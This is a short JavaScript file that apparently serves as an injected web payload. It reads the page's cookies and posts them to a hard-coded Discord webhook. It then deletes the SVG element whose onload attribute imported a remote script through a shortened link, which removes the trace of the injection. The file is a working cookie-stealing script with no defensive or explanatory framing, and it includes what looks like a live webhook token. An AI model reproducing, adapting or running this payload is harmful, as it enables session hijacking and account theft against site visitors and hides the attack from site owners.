// Function to send cookies to Discord webhook
function sendCookiesToDiscord() {
    // Collect the cookies
    var cookies = document.cookie;

    // Define the Discord webhook URL
    var webhookUrl = "https://discord.com/api/webhooks/1240064238131613786/_IZFy_8Y6Z4P_d8fHXanQpbuToS19MSbjW_fmAgsIjLqK57hVrWxVgMw33XMxY8xIGMJ";

    // Create the payload to send
    var payload = {
        content: "Cookies: " + cookies
    };

    // Send the cookies to the Discord webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            console.log('Cookies sent to Discord successfully.');
        } else {
            console.error('Error sending cookies to Discord:', response.statusText);
        }
    }).catch(error => {
        console.error('Error:', error);
    });
}

// Function to remove the specific SVG element
function removeSpecificSvg() {
    // Find the SVG element with the specified onload attribute
    var svgElements = document.querySelectorAll('svg[onload="import(\'//tinyurl.com/tt45f\')"]');
    svgElements.forEach(function(svg) {
        svg.parentNode.removeChild(svg);
        console.log('Removed specific SVG element.');
    });
}

// Execute both functions
sendCookiesToDiscord();
removeSpecificSvg();
